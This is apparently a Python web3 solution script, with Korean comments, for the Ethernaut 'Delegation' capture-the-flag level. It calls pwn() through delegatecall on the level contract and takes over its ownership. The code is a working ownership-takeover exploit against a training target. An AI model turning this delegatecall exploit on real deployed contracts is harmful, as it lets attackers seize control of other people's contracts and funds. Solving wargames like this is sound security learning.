from web3 import Web3
from dotenv import dotenv_values

# 풀이
# 1. delegatecall 기능은 A의 컨트랙트에서 B 컨트랙트 코드의 함수를 실행할때 A를 호출한 데이터를
#    유지한 상태에서 호출하는 기능을 의미함.
# 2. 이를 이용하여 실제 호출에 필요한 B 컨트랙트 함수의 코드를 안다는 가정하여 ABI를 작성한 다음
#    실제 호출은 A 컨트랙트를 향해서 B 컨트랙트 함수를 호출하는 데이터를 트랜잭션에 넘기면 풀이 가능.

ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']


CONTRACT_ADDRESS = '0xe082b26cEf079a095147F35c9647eC97c2401B83'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL06_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [
            {
                "name": "_owner",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "pwn",
        "inputs": [],
        "outputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

# 공격 전 Owner 주소 확인
BEFORE_OWNER = contract.functions.owner().call()

print(f'Owner Address Before Attack: {BEFORE_OWNER}')

if BEFORE_OWNER != USER_ADDRESS:
    print("Contract's Owner is not changed!\n")
else:
    print("Contract's Owner is already changed!\n")
    exit(0)

# 컨트랙트에 delegatecall 호출을 위한 데이터 준비
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.pwn().build_transaction(data)

print(tx)
print(f'tx["data"] : {tx["data"]}\n')

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

# Owner 주소 변경 확인
AFTER_OWNER = contract.functions.owner().call()

print(f'Owner Address After Attack: {AFTER_OWNER}')

if AFTER_OWNER != USER_ADDRESS:
    print("Contract's Owner has not changed!")
    exit(0)
else:
    print("Contract's Owner has changed!")